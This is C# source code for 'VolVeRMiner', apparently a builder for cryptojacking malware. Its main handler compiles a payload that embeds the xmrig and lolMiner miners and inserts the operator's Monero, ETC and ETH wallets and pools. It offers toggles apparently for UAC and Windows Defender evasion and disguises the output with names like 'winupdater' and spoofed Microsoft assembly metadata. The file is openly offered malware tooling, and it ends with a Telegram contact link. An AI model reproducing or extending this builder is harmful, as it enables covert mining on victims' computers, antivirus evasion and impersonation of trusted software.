using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Resources;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace VolVeRMiner
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            textBox7.Text = "Your Monero Wallet Adderss";
            textBox7.ForeColor = Color.Gray;
            textBox6.Text = "Your Monero Pool Adderss";
            textBox6.ForeColor = Color.Gray;
            textBox5.Text = "Your Monero Usage (Standard 25)";
            textBox5.ForeColor = Color.Gray;

            textBox1.Text = "Your ETC Wallet Adderss";
            textBox1.ForeColor = Color.Gray;
            textBox2.Text = "Your ETC Pool Adderss";
            textBox2.ForeColor = Color.Gray;
            textBox3.Text = "Your ETC Worker Name";
            textBox3.ForeColor = Color.Gray;

            textBox9.Text = "Your ETH Wallet Adderss";
            textBox9.ForeColor = Color.Gray;
            textBox10.Text = "Your ETH Pool Adderss";
            textBox10.ForeColor = Color.Gray;
            textBox11.Text = "Your ETH Worker Name";
            textBox11.ForeColor = Color.Gray;

            textBox8.Text = "File Name";
            textBox8.ForeColor = Color.Gray;
            textBox12.Text = "Folder Name";
            textBox12.ForeColor = Color.Gray;

        }

        public DRM VRF = new DRM();

        string resxPath2 = "VolVeR_miner.Properties.Resources";
        public string savePath;

        public string SaveDialog(string filter)
        {
            SaveFileDialog dialog = new SaveFileDialog
            {
                Filter = filter,
                InitialDirectory = Path.GetDirectoryName(System.Reflection.Assembly.GetEntryAssembly().Location)
            };
            if (dialog.ShowDialog() == DialogResult.OK)
            {
                return dialog.FileName;
            }
            return "";
        }


        private void button3_Click(object sender, EventArgs e)
        {
            CompilerParameters Params = new CompilerParameters();
            Params.GenerateExecutable = true;
            Params.ReferencedAssemblies.Add("System.dll");
            Params.ReferencedAssemblies.Add("System.Windows.Forms.dll");
            Params.CompilerOptions = "/unsafe";
            Params.CompilerOptions += "\n/t:winexe";




            Params.OutputAssembly = SaveDialog("Exe Files (.exe)|*.exe|All Files (*.*)|*.*");

            string Source = Properties.Resources.Program;
            string Source2 = Properties.Resources.config;
            string Source3 = Properties.Resources.Installer;
            string Source4 = Properties.Resources.RAM;
            string Source5 = Properties.Resources.Resources_Designer;


            using (var r = new ResourceWriter(Path.GetTempPath() + @"\" + resxPath2 + ".resources"))
            {


                r.AddResource("lolMiner", Properties.Resources.lolMiner);
                r.AddResource("xmrig",  Properties.Resources.xmrig);


            }

            Params.EmbeddedResources.Add(System.IO.Path.GetTempPath() + @"\" + resxPath2 + ".resources");
            Params.ReferencedAssemblies.Add("System.Management.dll");
            Params.ReferencedAssemblies.Add("System.Core.dll");
            Params.ReferencedAssemblies.Add("System.IO.Compression.FileSystem.dll");
            Params.ReferencedAssemblies.Add("System.IO.Compression.dll");
            Params.ReferencedAssemblies.Add("System.Windows.Forms.dll");


            Source2 = Source2.Replace("miner-pykypaljobplwfm", textBox4.Text);
            if (checkBox2.Checked == true)
            {
                Source2 = Source2.Replace("uac", "true");
            }
            if (checkBox2.Checked == false)
            {
                Source2 = Source2.Replace("uac", "false");
            }
            if (checkBox3.Checked == true)
            {
                Source2 = Source2.Replace("defender", "true");
            }
            if (checkBox3.Checked == false)
            {
                Source2 = Source2.Replace("defender", "false");
            }
            Source3 = Source3.Replace("winupdater", textBox8.Text);
            Source3 = Source3.Replace("DRR", textBox12.Text);
            Source2 = Source2.Replace("winupdater", textBox8.Text);
            Source2 = Source2.Replace("Windows", textBox12.Text);

            Source2 = Source2.Replace("monowallet", textBox7.Text);
            Source2 = Source2.Replace("monopool", textBox6.Text);
            Source2 = Source2.Replace("25", textBox5.Text);

            Source2 = Source2.Replace("etcwallet", textBox1.Text);
            Source2 = Source2.Replace("etcpool", textBox2.Text);
            Source2 = Source2.Replace("etcwork", textBox3.Text);


            Source2 = Source2.Replace("ethwallet", textBox9.Text);
            Source2 = Source2.Replace("ethpool", textBox10.Text);
            Source2 = Source2.Replace("ethwork", textBox11.Text);

            if (VRF.ch1 == true)
            {
                Source = Source.Replace("Installation Utility", VRF.ch2);
                Source = Source.Replace("Microsoft .NET Services Installation Utility", VRF.ch3);
                Source = Source.Replace("Microsoft® .NET Framework", VRF.ch4);
                Source = Source.Replace("Microsoft Corporation", VRF.ch5);
                Source = Source.Replace("© Microsoft Corporation.  All rights reserved.", VRF.ch6);
               

            }


            var settings = new Dictionary<string, string>();
            settings.Add("CompilerVersion", "v4.0"); //Указываем версию framework-a 2.0

            CompilerResults Results = new CSharpCodeProvider(settings).CompileAssemblyFromSource(Params, Source, Source2, Source4, Source5, Source3.ToString());

 


 

            if (Results.Errors.Count > 0)
            {

                foreach (CompilerError err in Results.Errors)
                    MessageBox.Show(err.ToString(), "Ошибка!", MessageBoxButtons.OK, MessageBoxIcon.Information); //Выводим циклом ошибки, если они есть
            }
            else
            {
                MessageBox.Show("Готово, https://t.me/VolVeRFM"); //Выводим сообщение что всё прошло успешно
            }

        }

        private void button4_Click(object sender, EventArgs e)
        {
          
 
                VRF.Show();
             



        }
        static string RandomString(int size)
        {
            Random random = new Random((int)DateTime.Now.Ticks);
            StringBuilder builder = new StringBuilder();
            char ch;
            for (int i = 0; i < size; i++)
            {
                ch = Convert.ToChar(Convert.ToInt32(Math.Floor(26 * random.NextDouble() + 65)));
                builder.Append(ch);
            }
            return builder.ToString();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            Random rnd = new Random();
            int random = rnd.Next(6, 20); 
            textBox4.Text = RandomString(random);
         
        }
  

        private void trackBar1_Scroll(object sender, EventArgs e)
        {
            // textBox5.Text = String.Format("{0}", trackBar1.Value);
            textBox5.Text = trackBar1.Value.ToString();
            trackBar1.Maximum = 100;
            trackBar1.Minimum = 10;
            trackBar1.TickFrequency = 10;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            var ofd = new OpenFileDialog();
            ofd.Filter = "jpg|*.jpg| bmp|*.bmp";
            if (ofd.ShowDialog(this) == DialogResult.OK)
                this.BackgroundImage = Image.FromFile(ofd.FileName);

        }
    }
}
